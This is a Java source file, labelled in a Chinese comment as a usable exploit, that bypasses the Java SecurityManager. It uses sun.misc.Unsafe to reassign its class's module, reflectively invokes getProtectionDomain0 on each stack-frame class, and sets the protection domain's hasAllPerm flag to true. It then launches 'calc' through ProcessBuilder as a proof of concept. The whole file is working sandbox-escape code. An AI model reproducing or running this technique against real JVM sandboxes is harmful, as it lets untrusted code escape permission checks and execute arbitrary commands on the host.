/*
可使用exp：通过反射获取getProtectionDomain0，刷新栈帧权限，绕过安全管理器限制
*/
package zk_backup_0.configs.conf1;

import sun.misc.Unsafe;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.security.ProtectionDomain;

public class ExpBypass4 {

    public static void main(String[] args) throws Exception {
        StackTraceElement[] stackTraceElements = Thread.currentThread().getStackTrace();
        //遍历栈帧
        for (StackTraceElement stackTraceElement : stackTraceElements) {
            try {

                Field unsafeField = Unsafe.class.getDeclaredField("theUnsafe");
                unsafeField.setAccessible(true);
                Unsafe unsafe = (Unsafe) unsafeField.get(null);

                Module module = Object.class.getModule();
                Class<?> currentClass = ExpBypass4.class;

                long addr = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
                unsafe.getAndSetObject(currentClass, addr, module);

                Class clz = Class.forName(stackTraceElement.getClassName());
                //利用反射调用getProtectionDomain0方法
                Method getProtectionDomain = clz.getClass().getDeclaredMethod("getProtectionDomain0", null);
                getProtectionDomain.setAccessible(true);
                ProtectionDomain pd = (ProtectionDomain) getProtectionDomain.invoke(clz);

                if (pd != null) {
                    Field field = pd.getClass().getDeclaredField("hasAllPerm");
                    field.setAccessible(true);
                    field.set(pd, true);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
//        Runtime.getRuntime().exec("calc");
        String command = "calc";
        ProcessBuilder builder = new ProcessBuilder(command.split("\\s+"));
        Process process = builder.start();
    }
}
